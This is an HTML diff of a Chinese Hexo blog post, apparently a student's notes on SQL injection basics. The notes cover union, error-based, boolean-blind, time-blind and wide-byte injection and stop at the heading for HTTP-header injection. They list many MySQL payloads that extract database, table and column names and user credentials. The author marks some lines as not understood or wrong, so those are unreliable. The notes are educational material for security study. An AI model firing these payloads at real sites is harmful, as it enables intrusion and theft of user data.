@@ -1,0 +1,509 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.png"/>
+	<link rel="shortcut icon" href="/img/logo_miccall.png">
+	
+			    <title>
+    Hexo
+    </title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="/css/mic_main.css" />
+    <link rel="stylesheet" href="/css/dropdownMenu.css" />
+    <meta name="keywords" content="miccall" />
+    
+    	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	 
+    <noscript>
+        <link rel="stylesheet" href="/css/noscript.css" />
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/img/bg.jpg') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
+
+			    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+    
+		
+<!-- Layouts -->
+
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css" />
+<link rel="stylesheet" href="/css/typo.css" />
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a href="/" class="logo">Vermouth</a>
+</header>
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special" >
+            <ul class="menu links" >
+			<!-- Homepage  主页  --> 
+			<li >
+	            <a href="/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <li class="active">
+	            <a href="#s1">分类</a>
+	                    <ul class="submenu">
+	                        <li>
+	                        
+	                    </ul>
+	        </li>
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+                    
+			</ul>
+</nav>
+
+        <div id="main" >
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url();background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >SQL注入基础</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h3 id="一、什么是SQL注入"><a href="#一、什么是SQL注入" class="headerlink" title="一、什么是SQL注入"></a>一、什么是SQL注入</h3><p>​当Web应用向后台数据库传递SQL语句进行数据库操作时。如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p>
+<p>（注入产生的原因是后台服务器接收相关参数未经过滤直接带入数据库查询）</p>
+<h3 id="二、SQL注入分类"><a href="#二、SQL注入分类" class="headerlink" title="二、SQL注入分类"></a>二、SQL注入分类</h3><p>1.根据请求方式分类：</p>
+<p>GET方式请求注入</p>
+<p>POST方式请求注入</p>
+<p>2.根据注入点参数分类</p>
+<p>整数型注入</p>
+<p>字符型注入</p>
+<p>搜索型注入</p>
+<p>3.<strong>根据SQL注入点反馈类型分类</strong>（重点）</p>
+<p>union类型</p>
+<p>基于错误显示</p>
+<p>布尔类型</p>
+<p>基于时间</p>
+<p>其他类型</p>
+<p>4.根据web应用的数据库类型分类（数据库样式扩充）</p>
+<p>MySQL（主要学习）</p>
+<p>SQLServer </p>
+<p>Oracle </p>
+<p>Access</p>
+<h3 id="三、SQL注入万能密码"><a href="#三、SQL注入万能密码" class="headerlink" title="三、SQL注入万能密码"></a>三、SQL注入万能密码</h3><p>​所谓万能密码就是绕过登录验证直接进入管理员后台的密码，这种类型的密码可以通用到很多存在此漏洞的网站所以称之为万能。</p>
+<p>（可以百度到总结好的万能密码）</p>
+<h3 id="四、union联合注入"><a href="#四、union联合注入" class="headerlink" title="四、union联合注入"></a>四、union联合注入</h3><p>1.判断注入类型</p>
+<p>a.根据提示在URL中输入：?id&#x3D;1，显示出账号密码</p>
+<p>b.输入?id&#x3D;1’，加单引号后变成三个单引号，程序无法执行</p>
+<p>c.添加注释符号将其绕过，输入?id&#x3D;1’ and 1&#x3D;1</p>
+<p>· 若满足以上三点，可以判断该url为字符型注入</p>
+<h3 id="五、什么是报错注入"><a href="#五、什么是报错注入" class="headerlink" title="五、什么是报错注入"></a>五、什么是报错注入</h3><p>​报错注入(英文名:Error-based injection )，就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中</p>
+<p>​正常用户访问服务器发送id信息返回正确的id数据。报错注入是想办法构造语句，让错误信息中可以显示数据库的内容，如果能让错误信息中返回数据库中的内容,即实现SQL注入。</p>
+<h3 id="六、报错注入的基本手法及使用"><a href="#六、报错注入的基本手法及使用" class="headerlink" title="六、报错注入的基本手法及使用"></a>六、报错注入的基本手法及使用</h3><p>（一）XPATH报错注入</p>
+<p>1.extractvalue(arg1,arg2)</p>
+<p>·接受两个参数，arg1：XML文档，arg2：XPATH语句</p>
+<p>select extractvalue(1,concat(Ox7e,(select user()),0x7e))</p>
+<p>2.updatexml(arg1,arg2,arg3)</p>
+<p>arg1为xml文档对象的名称；arg2为xpath格式的字符串；arg3为string格式替换查找到的符合条件的数据</p>
+<p>select updatexml(1,concat(Ox7e,(select user()),0x7e),1)</p>
+<p>（二）floor报错注入</p>
+<p>floor（）函数的作用是返回小于等于该值的最大整数，只返回 arg1整数部分，小数部分舍弃</p>
+<p>floor（）报错注入准确来说是floor、count、group by冲突报错，count（*）、rand（）、group by三者缺一不可</p>
+<p>报错注入经典公式：</p>
+<p>and select 1 from (select count(*)，concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)</p>
+<p>公式解析：</p>
+<p>floor()——取整数</p>
+<p>rand(0)*2——将取0到2的随机数</p>
+<p>floor(rand0*2)——有两条记录就会报错</p>
+<p>floor (rand(0)*2)——记录需为3条以上，且3条以上必报错，返回的值是有规律的</p>
+<p>count(*)——用来统计结果，相当于刷新一次结果</p>
+<p>group by ——在对数据进行分组时会先看虚拟表中是否存在这个值，不存在就插入；存在的话count(*)加1，在使用group by时floor(rand(0)*2)会被执行一次，若虚表不存在记录，插入虚表时会再执行一次</p>
+<p>（三）其他常用报错注入</p>
+<p>1.列名重复报错注入</p>
+<p>条件：name_const（）函数在低版本中可以支持5.0，但在高版本5.1+中就不支持了</p>
+<p>说明：name_const（name,value），当用来产生一个结果集合列时，name_const（）促使该列使用给定名称</p>
+<p>标准Payload：</p>
+<p>and select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a;</p>
+<p>2.整形溢出报错注入</p>
+<blockquote>
+<p>高版本不再适用</p>
+</blockquote>
+<p>3.几何函数报错注入</p>
+<blockquote>
+<p>高版本不再适用</p>
+</blockquote>
+<p>(四) 报错注入的用途</p>
+<blockquote>
+<p>1.查看数据库版本</p>
+</blockquote>
+<blockquote>
+<p>2.查看数据库名字</p>
+</blockquote>
+<blockquote>
+<p>3.查看数据库有多少个表</p>
+</blockquote>
+<blockquote>
+<p>4.查看数据库有哪些表</p>
+</blockquote>
+<blockquote>
+<p>5.查看表里有哪些列名</p>
+</blockquote>
+<blockquote>
+<p>6.查看表里面的数据</p>
+</blockquote>
+<p>（五）使用报错注入获得数据库信息的过程</p>
+<p>1.查看数据库版本</p>
+<p>1’ and extractvalue(1,concat(0x7e,(select version()),0x7e))</p>
+<p>2.查看数据库名字</p>
+<p>1’ and extractvalue(1,concat(0x7e,(select database()),0x7e))</p>
+<p>3.查看数据库有多少个表</p>
+<p>1’ and extractvalue(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e))<br>4.查看数据库有哪些表</p>
+<p>1’ and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e))</p>
+<p>5.查看表里有哪些列名</p>
+<p>1’ and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’表名’ limit 0,1),0x7e))</p>
+<p>6.查看表里面的数据</p>
+<p>1’ and extractvalue(1,concat(0x7e,(select group_concat(列名) from 表名),0x7e))–+</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A51.png" alt="报错注入1"><br><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A52.png" alt="报错注入2"></p>
+<h3 id="七、布尔盲注"><a href="#七、布尔盲注" class="headerlink" title="七、布尔盲注"></a>七、布尔盲注</h3><p>普通注入和盲注的区别</p>
+<table>
+<thead>
+<tr>
+<th>普通SQL注入</th>
+<th>SQL盲注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>执行SQL注入攻击时，服务器会响应来自数据库服务器的错误信息，信息提示SQL语法不正确等</td>
+<td>一般情况，执行SQL盲注，服务器不会直接返回具体的数据库错误or语法错误，而是会返回程序开发所设置的特定信息</td>
+</tr>
+<tr>
+<td>一般在页面上直接就显示执行sql语句的结果</td>
+<td>一般在页面上不会直接显示sql执行的结果</td>
+</tr>
+</tbody></table>
+<p> 布尔盲注概述：</p>
+<blockquote>
+<p>布尔型盲注时SQL盲注的一种，就是在进行SQL注入的时候，WEB页面仅返回True和False</p>
+</blockquote>
+<blockquote>
+<p>布尔型盲注会根据Web页面返回的True或者False信息，对数据库中的信息进行猜解，并获取数据库中的相关信息</p>
+</blockquote>
+<p>（一）substr（）、substring（）、mid（）</p>
+<p>说明：用来截取数据库某一列字段中的一部分，在各个数据库中的名称是不一样的</p>
+<p>用法：substr（arg1，int1，int2），arg1为被选取的字符串，int1为截取开始的位置，int2为截取长度</p>
+<p>表示：从int1开始的位置，截取int2个字符，注意：int1是从1开始的，不是从0开始的</p>
+<p>举例：</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/substr%E4%BE%8B%E5%AD%90.png" alt="substr例子"></p>
+<p>（二）length（）</p>
+<p>说明：获取数据库长度</p>
+<p>用法：length（arg1），arg1代表字符串</p>
+<p>举例：</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/length%E4%BE%8B%E5%AD%90.png" alt="length例子"></p>
+<p>（三）ascii（）</p>
+<p>说明：将单一字符，转化为ascii码</p>
+<p>用法：ascii（str），str代表字符</p>
+<p>举例：</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/ascii%E4%BE%8B%E5%AD%90.png" alt="ascii例子"></p>
+<p>（四）if（）</p>
+<p>说明：条件判断</p>
+<p>用法：if（arg1，arg2，arg3），arg1代表判断的条件，arg2是条件为真返回的结果，arg3是条件为假返回的结果</p>
+<p>举例：数据库名为ichunqiu</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/if%E4%BE%8B%E5%AD%90.png" alt="if例子"></p>
+<p>（五）通过布尔盲注可以得到什么数据：</p>
+<blockquote>
+<p>1.数据库长度</p>
+</blockquote>
+<blockquote>
+<p>2.数据库表名</p>
+</blockquote>
+<blockquote>
+<p>3.获取列名</p>
+</blockquote>
+<blockquote>
+<p>4.获取数据</p>
+</blockquote>
+<p>（六）使用布尔盲注获得数据库信息的过程</p>
+<p>1.获得数据库名的长度</p>
+<p>说明：通过页面回显判断数据库名长度</p>
+<p>举例：数据库名：security</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E8%BF%87%E7%A8%8B1.png" alt="布尔盲注过程1"></p>
+<p>2.获得数据库名</p>
+<p>说明：通过改变n和m获取数据库的字符</p>
+<p>方法：and ascii(substr(database(),n,1))&#x3D;m （n为位数，m为ascii码值）</p>
+<p>举例：数据库名为：security</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E8%BF%87%E7%A8%8B2.png" alt="布尔盲注过程2"></p>
+<p>3.获得数据库表名：</p>
+<p>获取表名过程：有几个表？—&gt;表名长度？—&gt;表名称？</p>
+<p>①获得表的个数</p>
+<p>方法：</p>
+<p>and (select count(*) from information_schema.tables where table_schema&#x3D;database())&gt;n 改变n的值，并结合页面回显判断表的个数</p>
+<p>举例：</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E8%BF%87%E7%A8%8B3.png" alt="布尔盲注过程3"></p>
+<p>②获得表名长度</p>
+<p>方法：</p>
+<p>and (select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit n,1)&gt;m 需要用limit来限制表的个数，每次读取一个表</p>
+<p>and (select length(group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())&gt;100  数据库中的表长总和</p>
+<p>举例：</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E8%BF%87%E7%A8%8B4.png" alt="布尔盲注过程4"></p>
+<p>③获得表名</p>
+<p>方法：用limit限制表的个数和字符的个数</p>
+<p>and ascii((substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit x,1),1,1)))&#x3D;z</p>
+<p>举例：</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E8%BF%87%E7%A8%8B5.png" alt="布尔盲注过程5"></p>
+<p>4.获取列名（先获取列名个数，再获取列名长度，最后获取列名）：</p>
+<p>①获得列的个数：</p>
+<blockquote>
+<p>and (select count(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’表名’)&#x3D;n</p>
+</blockquote>
+<p>②获得列名长度：</p>
+<blockquote>
+<p>and (select length(column_name) from information_schema.columns where table_name&#x3D;’表名’ limit n,1)&#x3D;m</p>
+</blockquote>
+<p>and length(substr((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;”emails” limit 0,1),1))&#x3D;1 「原理未知」</p>
+<p>③获得列名：</p>
+<p>方法一：</p>
+<blockquote>
+<p>and (ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’表名’ limit 0,1),1,1)))&gt;n</p>
+</blockquote>
+<p>方法二：</p>
+<blockquote>
+<p>(第一列)and substr((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’表名’),1,1)&#x3D;’a’</p>
+</blockquote>
+<blockquote>
+<p>(第二列)and substr((select column_schema from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’表名’ limit 1,1),1,1)&#x3D;’a’</p>
+</blockquote>
+<p>5.获取数据</p>
+<p>①获取行数</p>
+<p>and (select count(id) from users)&#x3D;n</p>
+<p>②获取数据</p>
+<blockquote>
+<p>and substr((select username from users limit 2,1),1,1)&#x3D;”D”</p>
+</blockquote>
+<blockquote>
+<p>and ascii(substr((select username from users limit 0,1),1,1))&#x3D;117 –+</p>
+</blockquote>
+<p>and ascii(substr((select group_concat(username,0x7e,password) from users limit 0,1),1,1))&#x3D;68 –+ 「原理未知」</p>
+<p>and ascii(substr((select distinct column_name from information_schema.columns where table_name&#x3D;users and table_schema&#x3D;database() limit 0,1)1,1))&#x3D;40 「有误」</p>
+<p>（七）时间盲注</p>
+<p>1.时间盲注常用的SQL函数</p>
+<p>sleep（）</p>
+<p>说明: sleep(int1)用来捕获到执行迅速不易被查看到的语句以确定我们的程序是否确实在服务器端发起了该语句，int1是中断的时间，单位是秒</p>
+<p>语句:select if(1&#x3D;1, sleep(3)，’goodbye’)</p>
+<p>结果:1&#x3D;1成立，延时三秒</p>
+<p>benchmark（）</p>
+<p>说明: benchmark(arg1,arg2)用来测试一些函数的执行速度。arg1是执行的次数，arg2是要执行的函数或者是表达式。与sleep()函数基本一样，但是当sleep)不能使用时，可以使用benchmark()函数</p>
+<p>语句:select if(1&#x3D;1, benchmark(5000000,md5(‘abc’)), ‘goodbye’)</p>
+<p>结果:1&#x3D;1成立，页面延迟x秒显示，根据机器性能不同，执行时间不同</p>
+<p>2.时间盲注获得数据库内容的基本过程</p>
+<blockquote>
+<p>获得数据库名长度</p>
+</blockquote>
+<p>and if((length(database())&#x3D;n),sleep(10),1)</p>
+<p>通过页面显示的时间判断数据库名长度，可以通过网络查看时间</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5x.png" alt="时间注入x"></p>
+<p>也可以通过burp抓取，发送到repeater，再发送给response后在右下角可查看时间</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5y.png" alt="时间注入y"></p>
+<blockquote>
+<p>获取数据库名</p>
+</blockquote>
+<p>and if(ascii(substr(database(),n,1)&#x3D;m),sleep(5),1) 通过改变n和m依次获取数据库的字符</p>
+<blockquote>
+<p>获取数据库表名（同理先获取长度）</p>
+</blockquote>
+<p>①获得表的个数</p>
+<p>and if((select count(table_name) from information_schema.tables where table_schema&#x3D;database() )&#x3D;n,sleep(5),1)</p>
+<p>②获得表名长度</p>
+<p>and if(length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;n,sleep(5),1) </p>
+<p>③获得表名</p>
+<p>and if((ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)))&#x3D;n,sleep(5),1)–+</p>
+<blockquote>
+<p>获取数据库列名</p>
+</blockquote>
+<p>①获取列的个数</p>
+<p>and if((select count(column_name) from information_schema.columns where table_name&#x3D; ‘users’)&#x3D;n,sleep(5),1)</p>
+<p>②获取列名长度</p>
+<p>and if(length(substr((select column_name from information_schema.columns where table_name&#x3D; ‘users’ limit 1,1),1))&#x3D;n,sleep(5),1)</p>
+<p>③获取列名</p>
+<p>and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1,1))&#x3D;n,sleep(5),1)</p>
+<blockquote>
+<p>获取数据</p>
+</blockquote>
+<p>①获取行数</p>
+<p>and if((select count(id) from users)&#x3D;n,sleep(5),1)</p>
+<p>②获取信息</p>
+<p>and if(ascii(substr((select username from users limit 0,1),1,1))&#x3D;68,sleep(5),1)</p>
+<p>（八）宽字节注入</p>
+<p>1.什么是宽字节</p>
+<p>宽字节是指两个字节宽度的编码技术</p>
+<p>2.造成宽字节注入的原因</p>
+<p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字</p>
+<p>3.GBK编码原理</p>
+<p>一个字符占1个字节，两个字节以上叫宽字节</p>
+<p>设置“set character_set_client&#x3D;gbk” ( gbk编码设置），通常导致编码转换的注入问题，尤其是使用php连接mysql数据库的时候</p>
+<p>一个gbk汉字占两个字节，取值范围是（编码位数）︰第一个字节为129-254，第二个字节为64-254</p>
+<p>当设置gbk编码后，遇到连续两个字节，都符合gbk取值范围，会自动解析为一个汉字</p>
+<p>4.宽字节注入原理</p>
+<p>程序员为了防止sql注入，对用户输入中的单引号( ‘ )进行处理，在单引号前加上斜杠( \ )进行转义，这样被处理后的sql语句中，单引号不再具有”作用’，仅仅是’内容’而已。</p>
+<p>换句话说，这个单引号无法发挥和前后单引号闭合的作用，仅仅成为”内容’</p>
+<p>5.宽字节注入方法</p>
+<p>黑盒</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/%E5%AE%BD%E5%AD%97%E8%8A%82%E9%BB%91%E7%9B%92.png" alt="宽字节黑盒"></p>
+<p>白盒</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21/%E5%AE%BD%E5%AD%97%E8%8A%82%E7%99%BD%E7%9B%92.png" alt="宽字节白盒"></p>
+<p>（九）HTTP头注入</p>
+
+            </div>
+
+            <!-- Post Comments -->
+            
+    <!-- 使用 DISQUS_CLICK -->
+<div id="disqus-comment">
+    <div id="disqus_thread"></div>
+
+<!-- add animation -->
+<style>
+	.disqus_click_btn {
+            line-height: 30px;
+            margin: 0;
+            min-width: 50px;
+            padding: 0 14px;
+            display: inline-block;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0;
+            overflow: hidden;
+            will-change: box-shadow;
+            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
+            outline: 0;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            vertical-align: middle;
+            border: 0;
+            background: rgba(158, 158, 158, .2);
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
+            color: #fff;
+            background-color: #7EC0EE;
+            text-shadow: 0
+        }
+</style>
+	
+<div class="btn_click_load" id="disqus_bt"> 
+    <button class="disqus_click_btn">点击查看评论</button>
+</div>
+
+<!--
+<script type="text/javascript">
+$('.btn_click_load').click(function() {
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'http-miccall-tech'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+
+    document.getElementById('disqus_bt').style.display = "none";
+});
+</script>
+-->
+<script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'http://example.com/2022/03/31/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://example.com/2022/03/31/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+</script>
+
+<script type="text/javascript">
+    $('.btn_click_load').click(function() {  //click to load comments
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document;
+            var s = d.createElement('script');
+            s.src = '//http-miccall-tech.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', + new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+        $('.btn_click_load').css('display','none');
+    });
+</script>
+</div>
+<style>
+    #disqus-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy;Powered By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
+                <li>Design: <a target="_blank" rel="noopener" href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
+            </ul>
+            
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+			
+        </div>
+    </div>
+</body>
+
+
+
+ 	
+</html>
